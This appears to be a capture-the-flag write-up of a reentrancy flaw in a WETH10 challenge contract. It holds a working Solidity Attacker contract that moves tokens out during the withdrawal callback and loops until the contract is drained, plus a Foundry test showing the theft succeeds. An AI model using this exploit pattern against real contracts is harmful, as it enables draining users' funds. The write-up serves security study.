## The vulnerability

Reentrancy in WETH10.withdrawAll() (src/weth10.sol#26-29):

This function is vulnerable to reentrancy. In fact while the function is protected by a reenentrancy guard, it does not guarantee that the contract is protected against reentrnacies.

The nonReentrant modifier checks if other functions with the same modifier are called in the same call, and it reverts if that is the case. 
The problem is that the standard ERC20 function ERC20._transfer(), and it's external counterparts ERC20.transfer() and ERC20.transferFrom() are not supplied with the nonReentrant modifier, so they can be used if a function is vulnerable to reentrancy.

Here it is the vulnerable function:

 `function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender)); // vulnerable external call
        _burnAll();
    }`

This function perform an external call, that can be leveraged by an attacker contract to transfer his token out of his wallet before the _burnAll() burns all the tokens that are in his wallet.

## Attacker steps

The attacker deploys an Attacker, that contains an exploit() function which:

1) calls the WETH10.deposit() function depositing 1 ether
2) calls the WETH10.withdrawAll() function to withdraw 1 ether
3) by sending ethers to the Attacker contract it triggers the Attacker.fallback() function, the function sends all the WETH10 tokens inside the Attacker contract to an external address owned by the Attacker.
4) after the fallback returns, the WETH10._burnAll() function is called, and it burns the whole WETH10 token balance inside the attacker contract, but since all the tokens have been taken out, it burns none of them.
5) after the WETH10._burnAll() execution is over, the next step is to pull back the token from the Attacker EOA (it requires approving Attacker contract with the WETH10 tokens owner by the Attacker EOA previously).
6) now that the attacker contract owns all the unburned tokens, it can iterate steps 2 to 5 until it has complitely drained the WETH10 contract

## POC

Attacker.sol:



    pragma solidity ^0.8.0;

    import "./weth10.sol";

    contract Attacker {
        WETH10 public target;
        address public bob;

        constructor(address payable _target, address payable _bob) {
            target = WETH10(_target);
            bob = _bob;
        }

        fallback() external payable {
            target.transfer(bob, 1 ether);
        }

        function deposit(uint256 amount) public payable {
            target.deposit{value: (amount)}();
        }

        function withdrawAll() public {
            payable(msg.sender).transfer(address(this).balance);
        }

        function attack(uint256 amount) public {
            uint256 prevBalance = address(target).balance;
            target.withdrawAll();
            prevBalance = address(target).balance;
            target.transferFrom(bob, address(this), amount);
        }

        function exploit() external payable {
            deposit(1 ether);
            while ((address(target).balance) > 1 wei) {
                attack(1 ether);
            }
            withdrawAll();
        }
    }



weth10.t.sol:

    
    pragma solidity ^0.8.0;

    import "forge-std/Test.sol";
    import "../src/Counter.sol";
    import "../src/weth10.sol";
    import "../src/Attacker.sol";

    contract Weth10Test is Test {
        WETH10 public weth;
        Attacker public attacker;
        address owner;
        address bob;

        function setUp() public {
            weth = new WETH10();
            bob = makeAddr("bob");
            attacker = new Attacker(payable(address(weth)), payable(bob));

            vm.deal(address(weth), 10 ether);
            vm.deal(address(bob), 1 ether);
        }

        function testHack() public {
            assertEq(
                address(weth).balance,
                10 ether,
                "weth contract should have 10 ether"
            );

            vm.startPrank(bob);

            // hack time!
            weth.approve(address(attacker), 11 ether);
            attacker.exploit{value:1 ether}();


            vm.stopPrank();
            console.logUint(address(weth).balance);
            assertEq(address(weth).balance, 0, "empty weth contract");
            assertEq(bob.balance, 11 ether, "player should end with 11 ether");
        }
    }
